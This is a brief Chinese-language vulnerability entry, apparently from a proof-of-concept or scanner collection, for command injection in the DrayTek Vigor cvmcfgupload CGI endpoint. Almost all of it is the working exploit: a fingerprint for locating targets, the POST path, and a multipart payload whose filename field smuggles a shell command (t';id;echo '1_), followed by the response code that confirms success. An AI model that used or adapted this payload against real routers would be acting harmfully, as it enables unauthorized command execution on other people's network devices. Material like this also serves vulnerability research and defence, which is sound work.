# DrayTekVigorcvmcfgupload存在命令执行漏洞

DrayTekVigorcvmcfgupload ｜ 命令执行 ｜ —
- **指纹**：`body="excanvas.js"`
- **请求**：`POST /cgi-bin/mainfunction.cgi/cvmcfgupload?1=2 HTTP/1.1`

**Payload**
```
------WebKitFormBoundary
Content-Disposition: form-data; name="abc"; filename="t';id;echo '1_"
Content-Type: text/x-python-script
123
------WebKitFormBoundary--
```
- **响应特征**：200